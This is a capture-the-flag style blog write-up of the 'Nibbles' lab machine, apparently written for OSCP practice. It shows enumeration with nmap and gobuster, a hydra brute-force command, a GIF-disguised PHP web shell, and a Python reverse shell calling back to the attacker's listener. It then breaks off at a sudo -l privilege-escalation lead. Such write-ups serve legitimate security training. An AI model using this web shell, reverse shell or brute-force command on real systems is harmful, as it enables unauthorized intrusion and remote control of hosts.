---
layout: post
title: "OSCP: Nibble"
description: "The key point of successfully breaching this case is the luck, the luck you have when you are guessing the blog admin login credential. Nothing else!d"
categories: [OSCP]
tags: [Linux,Redteam]
comments: true
---

# Nibbles
Created: Feb 29, 2020 5:08 PM

START TIME: 29th February 2020 

PWNED TIME: 12th April 2020

# What I learnt ?

1. using burp suite to resubmit customized URL containing the python reserve shell.
2. using burp suite or gobuster to look for interesting php files, which might point to admin portal.
3. the basic techniques for linux local privilege escalation.  
4. the basic techniques for spawning much more user-friendly shell.
5. Avoid using too much automative tools like metasploit to build reverse shell
6. Try my best to understand the theory behind the scene, why this vulnerability can be exploited ? any other approaches, thinking out of the box. 

Use Burpsuite, locate the login portal and its url, then use burpsuite repeater to repeat the login access.

![Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled.png](Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled.png)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
```

Using hydra to brute force attack the application, could be blocked. 

HTTP Application has enabled black block list, how to bypass it ? 

used to upload to target and execute arbitrary command 

```php
GIF8;
<?php echo system($_REQUEST['cx']); ?>
```

Magic for image file is "GIF8;"

Execute commands through php interface:

```bash
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cx=whoami
```

Burp Suite : Ctrl + u to encode the command

# Task 1 : Enumerate services

```bash
gent79@Gent79:~/Documents/htd/nibbles$ sudo nmap -sV -A -vvv -oA nmap/initial 10.10.10.75
# Nmap 7.80 scan initiated Sat Feb 29 22:00:43 2020 as: nmap -sV -A -vvv -oA nmap/initial 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up, received reset ttl 63 (0.26s latency).
Scanned at 2020-02-29 22:00:43 EST for 1364s
Not shown: 997 closed ports
Reason: 997 resets
PORT     STATE    SERVICE  REASON         VERSION
**22/tcp**   open     ssh      syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
**80/tcp   open     http**     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
**2910/tcp filtered tdaccess no-response**
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/29%OT=22%CT=1%CU=40816%PV=Y%DS=2%DC=T%G=Y%TM=5E5B2AA
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%TS=C)
OS:SEQ(SP=104%GCD=2%ISR=10B%TI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW
OS:7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%
OS:W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DN
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.004 days (since Sat Feb 29 22:17:42 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   261.43 ms 10.10.14.1
2   261.86 ms 10.10.10.75

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 29 22:23:27 2020 -- 1 IP address (1 host up) scanned in 1363.99 seconds
```

Crawling the target to identify interesting url and object. 

Burpsuite community edition does not support scan function, I installed OWASP ZAP.

Try other web scanner to crawl all interesting URL.

```bash
root@Gent79:~/Documents/Nibble# whatweb -v 10.10.10.75
WhatWeb report for http://10.10.10.75
Status    : 200 OK
Title     : <None>
IP        : 10.10.10.75
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.18 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Sun, 12 Apr 2020 08:39:52 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
	ETag: "5d-5616c3cf7fa77-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 96
	Connection: close
	Content-Type: text/html

```

Locate the admin login portal:

```bash
root@Gent79:~/Documents/Nibble# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -u http://10.10.10.75/nibbleblog/ 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/12 06:15:37 Starting gobuster
===============================================================
/index.php (Status: 200)
/sitemap.php (Status: 200)
/content (Status: 301)
/feed.php (Status: 200)
/themes (Status: 301)
/admin (Status: 301)
/admin.php (Status: 200)
```

# Task 2 : Vulerability

Find nibble blog version vulnerability or bugs

```bash
root@Gent79:~/Documents/Nibble# searchsploit nibble
----------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                 |  Path
                                                                                               | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------- ----------------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                         | exploits/php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                          | exploits/php/remote/38489.rb
----------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

# Task 3 : Get tty-shell

The code below will echo the output

```bash
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cx=whoami
```

Next, how to gain the shell ? 

prepare the php file camouflaged as image file, and prepare the listen nc at attack side. 

How to send HTTP GET with cookie in Burpsuite ? 

![Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled%201.png](Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled%201.png)

Got the reverse shell with below code

```python
python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.16.71",7979))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'
```

but 

```python
gent79@Gent79:~/Documents/htd/nibbles$ sudo nc -lvnp 7979
listening on [any] 7979 ...
connect to [10.10.16.71] from (UNKNOWN) [10.10.10.75] 53972
/bin/sh: 0: can't access tty; job control turned off
```

Try spawn a tty from above session

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

What is the purpose of executing following commands? 

![Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled%202.png](Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled%202.png)

The article talks about the knowledge of using stty to upgrade pty spawned from python script. 

[http://www.linusakesson.net/programming/tty/](http://www.linusakesson.net/programming/tty/)

[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

# Task 3 : Escalation

iterate the SUID applications on target:

```bash
**nibbler@Nibbles:/$ find / -perm -u=s -type f 2>/dev/null** 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/newuidmap
/bin/ping6
/bin/su
/bin/fusermount
/bin/ntfs-3g
/bin/umount
/bin/ping
/bin/mount

**nibbler@Nibbles:/$ find / -perm -g=s -type f 2>/dev/null** 
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/bin/wall
/usr/bin/expiry
/usr/bin/screen
/usr/bin/at
/usr/bin/crontab
/usr/bin/mlocate
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/ssh-agent
```

[Linenum.sh](http://linenum.sh) to dig out the valuable entry points.

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Further digging the report from Linenum script reveals that the target system is using sudo version 1.8.16 which is affected by a sever vulnerability, which allows the authenticated user to escalate privilege.

[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

```bash
nibbler@Nibbles:/tmp$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
